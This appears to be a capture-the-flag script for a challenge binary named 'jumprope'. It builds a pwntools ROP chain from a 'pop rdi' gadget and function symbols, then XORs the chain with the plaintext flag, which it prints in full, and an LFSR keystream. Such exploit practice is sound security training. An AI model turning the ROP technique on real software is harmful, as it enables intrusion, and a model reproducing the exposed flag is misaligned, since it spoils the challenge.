#!/usr/bin/env python3

from Crypto.Util.number import *
from pwn import *

bits = 8

def lfsr(n):
    for i in range(bits):
        bit = 0
        temp = n
        for j in range(bits):
            if isPrime(j+1):
                bit ^= temp&1
            temp >>= 1
        n >>= 1
        n += bit << (bits-1)
    return n

flag = b"ictf{n0t_last_night_but_the_night_bef0re_twenty_f0ur_hackers_came_a_kn0cking_at_my_d00r}"
print(len(flag))

elf = ELF("./jumprope")
rop = ROP(elf)

POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]# Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]
C = elf.symbols["c"]
O = elf.symbols["o"]
R = elf.symbols["r"]
E = elf.symbols["e"]
T = elf.symbols["t"]

exploit = p64(C) + p64(POP_RDI) + p64(0x1337c0d3) + p64(O) + p64(R) + p64(R) + p64(E) + p64(C)
exploit += p64(POP_RDI) + p64(0xdeadface) + p64(T)

print(len(exploit))

out = []

val = 2
for i in range(88):
    val = lfsr(val)
    # print(val)
    out.append(flag[i]^exploit[i]^val)

print(out)
